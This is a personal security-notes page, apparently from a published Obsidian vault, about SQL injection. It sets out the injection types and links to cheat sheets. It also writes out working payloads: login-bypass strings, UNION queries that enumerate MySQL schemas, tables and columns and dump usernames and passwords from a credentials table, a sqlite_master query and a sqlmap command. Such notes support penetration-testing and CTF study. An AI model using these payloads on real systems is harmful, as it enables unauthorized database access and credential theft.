---
{"dg-publish":true,"permalink":"/net/sec/sql-injection/"}
---

- [[SQLMAP\|SQLMAP]]
	- [[SQLMAP - Injection Types\|SQLMAP - Injection Types]]
- [[sqli - detect number of columns\|sqli - detect number of columns]]
## Types of SQL Injection

- Error Based
- Boolean
- Time Based 
  - Sleep in SQL
- Out of Band 
  - DNS communication / Ping Query

See [[SQLMAP - Injection Types\|SQLMAP - Injection Types]]
## Examples

- [w3shools](https://www.w3schools.com/sql/sql_injection.asp)
- [Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Ring0ctf](https://ringzer0ctf.com/challenges/wu/1/?doc=10662)


```cardlink
url: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
title: "SQL Injection Authentication Bypass Cheat Sheet"
description: "This list can be used by penetration testers when testing for SQL injection authentication bypass.A penetration tester can use it manually or through burp in order to automate the process.The creat…"
host: pentestlab.blog
favicon: https://pentestlab.blog/wp-content/uploads/2024/08/cropped-pentestlab.webp?w=32
image: https://pentestlab.blog/wp-content/uploads/2024/08/cropped-pentestlab.webp?w=200
```



## Common SQL Injections

### [[SQLMAP - Injection Types#Boolean-based blind\|Blind Boolean]]

```sql
105 OR 1=1
```

```sql
' OR '1
```

```sql
' OR 1=1
```

```sql
" OR 1=1
```

```sql Best Flag
'OR 1=1-- 
```

```sql
'OR 1=1;-- 
```
```ad-info
SELECT * FROM logins
WHERE username='tom'
AND password = '=='OR 1=1;--==';
```
```sql
"OR 1=1--
```
```sql
admin' AND 1;--
```

```sql
admin' or '1'='1
```

```sql
admin' OR '1'='1'-- -
```
```ad-info
SELECT * FROM logins 
WHERE username='tom' 
AND password = '==admin' OR '1'='1'-- -==';
```
```sql
1'or'1'='1
```
```ad-info
SELECT * FROM logins
WHERE username='tom' 
AND password = '==1'or'1'='1==';
```

```sql
admin');--
```
### [[SQLMAP - Injection Types#Union query-based\|Union Clause]]

A `UNION` statement can only operate on `SELECT` statements with an equal number of columns.

```bash
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```
#### Solution

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

or, 


```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```

## Database Specific Injections

### [[db/sqlite\|sqlite]]


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



```sql
123' UNION SELECT name, sql, null from sqlite_master;--
```



</div></div>


### [[db/relational databases/MySQL/MySQL\|MySQL]]


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">




## Getting number of columns

```sql
1' ORDER BY 5 #
```

```
SELECT @@version
```

| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |

## Getting user information

```sql
'OR 1=1 UNION SELECT 1, user(), 3, 4;-- 
```
## Getting current database name

```sql
'OR 1=1 UNION SELECT 1, database(), 3, 4;-- 
```

## Getting all the databases

```sql
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

## Get tables and schemata (database=dev)
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

## Get columns
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
## Get Data

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```


```ad-attention
There is an extra dash (-) at the end, it is to show that there is a space after (--).
```

## Prefix/Suffix

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

This will result in an enclosure of all vector values between the static prefix `%'))` and the suffix `-- -`.  
For example, if the vulnerable code at the target is:

Code: php

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

The vector `UNION ALL SELECT 1,2,VERSION()`, bounded with the prefix `%'))` and the suffix `-- -`, will result in the following (valid) SQL statement at the target:

Code: sql

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

</div></div>



## Tools

- [[SQLMAP\|SQLMAP]]


```cardlink
url: https://github.com/swisskyrepo/PayloadsAllTheThings
title: "GitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF"
description: "A list of useful payloads and bypass for Web Application Security and Pentest/CTF - swisskyrepo/PayloadsAllTheThings"
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://repository-images.githubusercontent.com/71220757/c7175e80-dafd-11ea-8e0b-9c42c639ae35
```


## Database Specific

### [[db/relational databases/MySQL/MySQL\|MySQL]]

```cardlink
url: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
title: "PayloadsAllTheThings/SQL Injection/MySQL Injection.md at master · swisskyrepo/PayloadsAllTheThings"
description: "A list of useful payloads and bypass for Web Application Security and Pentest/CTF - swisskyrepo/PayloadsAllTheThings"
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://repository-images.githubusercontent.com/71220757/c7175e80-dafd-11ea-8e0b-9c42c639ae35
```


## Tools

- https://www.kitploit.com/p/sql-injection-tools.html
- [[SQLMAP\|SQLMAP]]

## Comments in [[net/sec/Sql Injection\|sqli]]

Note: In SQL, using **two dash**es only is not enough to start a comment. So, **there has to be an empty space after them**, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.